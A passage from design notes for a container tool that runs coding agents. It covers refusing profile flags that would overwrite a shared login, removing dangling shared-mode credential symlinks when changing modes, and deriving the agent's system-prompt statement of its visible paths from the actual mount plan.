  the agent family has no delivery mechanism. The set `_MCP_DELIVERY` IS the
  list of families that can receive them, so adding a family without adding
  delivery refuses rather than silently dropping the tools. Codex delivery
  (`CODEX_HOME/config.toml [mcp_servers]`) remains unbuilt — now loudly.
- **Agent vs auth mode are separated by construction.** `init` groups agent
  plugins by their manifest `auth_family` and treats the shortest name in each
  family as the base agent; everything else is a mode variant, refused with the
  two commands that do what the user meant. No `-shared`/`-broker` suffix
  matching, so a mode added later classifies correctly untouched.
- **`hpc build` reads the project you are standing in**, and refuses outside
  one rather than guessing.
- **`auth use` refuses an unknown family** (naming the right one when the user
  typed an agent), and no longer reports "already in the requested mode" when
  every family was skipped for want of a plugin.

Observed, not just tested: each was driven through the real CLI before and
after. `--auth-mode` help rendered; browser+codex refusing and browser+claude
still binding `mcp-servers.json`; all four `init --agent` cases; all three
`auth use --family` cases; `_agent_plugin_for_cwd()` in a codex project, a
claude project, and outside one.

## 4dv. `--auth-profile` selects a credential in isolated mode only, and a shared login under a named profile is refused

**The claim that was wrong.** `--auth-profile` promised, in its own help text,
that you could "keep personal and work logins side by side" at
`<creds-dir>/profiles/<name>/`, and `docs/PROFILES.md` described the axis the
same way — unconditionally, for every auth mode. For a SHARED login that is
false. The shared login hook writes `shared-auth/agent-<agent>/`
unconditionally; the string "profile" does not occur in it anywhere. So

    botainer auth login --shared --auth-profile work
    botainer auth login --shared --auth-profile personal

wrote the SAME file twice and the second OVERWROTE the first account's refresh
token. Not shadowed — gone, with no command that restores it, in the mode the
HPC guide teaches.

**What is true per mode, measured by driving `botainer auth login`.** The
profile axis ALWAYS selects this agent's history and settings directory. It
selects a CREDENTIAL only where the login hook reads it:

| mode | credential written to | profile selects the credential? |
|---|---|---|
| isolated | `<project state>/data/agent-<agent>/profiles/<name>/` | yes |
| shared | `shared-auth/agent-<agent>/` | **no — one login per agent, host-wide** |
| broker | reads the SHARED credential above | **no** |

**The rule.** A login that resolves to the family's shared login plugin refuses
a non-default `--auth-profile`, names the file it would have overwritten, says
that the profile still selects history and settings, and points at isolated
mode — the one mode that can actually honour it.

**Keyed on the RESOLVED plugin, not on the mode name, and that distinction is
load-bearing.** The first version of this guard tested the requested mode name
(`shared`, `proxy`). It was wrong: **broker mode has no login hook of its own
and falls back to the SHARED login plugin**, so `--broker --auth-profile work`
overwrote the identical file while passing a mode-name check. The shipped guard
reads the variable the mode dispatch just assigned, so it cannot drift from the
dispatch, and a future mode that also falls back to the shared login is covered
without being enumerated. Proxy is deliberately NOT covered: its `login` command
runs the proxy STARTER rather than a login, so what it writes is not established
here, and an unverified claim inside a refusal is worse than no claim.

**This is a FILTER, not a structural property, and the structural gap it backs
up is named.** The credential is still one file that two modes can write; what
changed is that the CLI refuses to do so under a name implying otherwise.
Making it structural means per-profile shared credentials, and that is a
BIND-PATH change — the per-project credential is a symlink to one fixed path,
so a profile-aware login without a profile-aware bind produces a link pointing
at a file nobody writes. That is this surface, and it is not done.

**Related.** §4du (a config may not name the state root).

## 4dw. Leaving shared mode clears the credential link it wrote, so the project can start again

**The dead end.** In shared mode a project's credential is a SYMLINK to an
in-container path under `/shared-auth/`, dangling when read from the host. That
is correct in shared mode, and the README written beside it says so: "DANGLING
when viewed from the host filesystem, by design. Don't 'fix' them."

Switching the project to isolated left that link in place. Measured:

    exists()  -> False        is_symlink() -> True
    lexists() -> True         stat()       -> FileNotFoundError

Checks that ask `exists()` see nothing; checks that ask `lexists()` see
something — which is why the surfaces disagreed with each other. The isolated
pre_session hook asks `exists()`, so it refused with "no credentials; run
login", and the login it named could not write through the dangling link either
(the login container has no `/shared-auth` bound, so the write is ENOENT and
lands nowhere). The user was sent to a command that cannot succeed, by a check
that cannot see what is wrong, against a file the shipped README told them not
to touch.

**Structure, then a rule that names its gap.** `botainer auth use <mode>` now
clears that family's shared-mode leftovers whenever the new mode is not shared,
so the state never forms on the supported path. The agent pre_session hooks
(both `agent-claude` and `agent-codex`, together — this is the sibling-drift
class) additionally RECOGNISE a leftover and name the command that clears it.
That second half is a FILTER and it backs up a stated gap: `auth use` is not the
only way a mode changes, because editing `.botainer/config.yaml` by hand
bypasses it entirely.

**What is removed and what is never removed.** Only a symlink whose target
begins with the container prefix — including a DIRECTORY symlink, which is
deliberate but worth stating — and a regular file named `README.shared-mode.txt`
in that directory. The second is matched BY NAME: "the README this project
wrote" is what it means, not what it checks, so a file of that name holding
something else would also go. A REGULAR credential file is never removed — that is a real isolated-mode
login. A symlink pointing anywhere else is never removed — that is the user's
own arrangement. The shared credential itself is untouched: `Path.unlink()` does
not follow a final symlink.

**A limit I claimed here was WRONG, and the correction is the entry.** This
section previously said a resolve-then-delete rewrite "is NOT caught by any
test" and that catching it "would need `/shared-auth/` to exist at the real root
of the filesystem". Both are false, and a refuting review disproved them by
running the thing rather than reasoning about it:

* Installing `entry.resolve().unlink()` fails an existing test on the first run
  — `resolve()` on a dangling link raises `FileNotFoundError`, the surrounding
  `except OSError` swallows it, and the link is never removed. A visible
  behaviour change, already covered.
* The one variant that DID survive — delete the resolved target, then unlink the
  link — is now killed by a test that points the container prefix (a module
  constant) at a temp directory, making the target reachable and the two
  behaviours distinguishable. No filesystem root is involved.

The protection is still the POSIX property that `Path.unlink()` does not follow
a final symlink, and that is pinned on its own. What changed is that the
destructive rewrite is now covered by a test instead of by an assertion that it
could not be.

**Related.** §4dv (`--auth-profile` selects a credential in isolated mode only).

## 4dx. What AGENT_HINTS tells the agent about its reach is derived from the plan

**The false claim.** `AGENT_HINTS.md` told every agent, in every session, that
"Files outside `/workspace` are not visible to you." Measured on a plain default
project, the agent also reaches `/packages`, `/scratch` and `/home/user`, and
plugins add more. It was false on the first session anyone runs.

**Why this error pointed the wrong way.** AGENT_HINTS is injected into the
agent's system prompt — it is the agent's picture of its own cage. An agent told
it cannot see what it CAN see will tell the USER so, confidently, about privacy.
"I can't see anything outside the project" is the sentence someone would rely on
before putting something sensitive in a neighbouring directory.

**The other half, which no agent-facing surface carried at all.** The null-bind
mask on `/workspace/.botainer` hides the host's copy of the project's config and
id from the agent. Nothing said that was deliberate, so the readings available
to the agent were "empty" or "broken". It is now disclosed as deliberate, with
the path named.

*(Not literally empty, and the first version of this section said it was. Three
paths are mounted back on top of the mask — `AGENT_ACCESS.txt`, `AGENT_HINTS.md`
and the per-agent data dir — which §1 of this contract already describes as
"Nested on top of the null-bind", and the rendered hints list all three twelve
lines above. What the mask removes is everything ELSE under that directory.)*

**Derived, not asserted.** The list is built from `spec.mount_plan.binds` — the
same plan the adapter renders into argv — with each target's mode. A hardcoded
sentence was wrong the moment a plugin contributed a bind; this cannot drift
from the session it describes, and a test adds a bind via the project config and
requires it to appear.

**Scoped, so it does not overcorrect.** "Nothing else is visible" would be the
same defect reversed: `/usr`, `/bin` and the agent's own tooling are visible and
come from the IMAGE, not the user's machine. The claim is limited to host paths
and says where everything else comes from.

**Related.** §4dw (shared-mode leftovers), §1 (the bind table this renders).
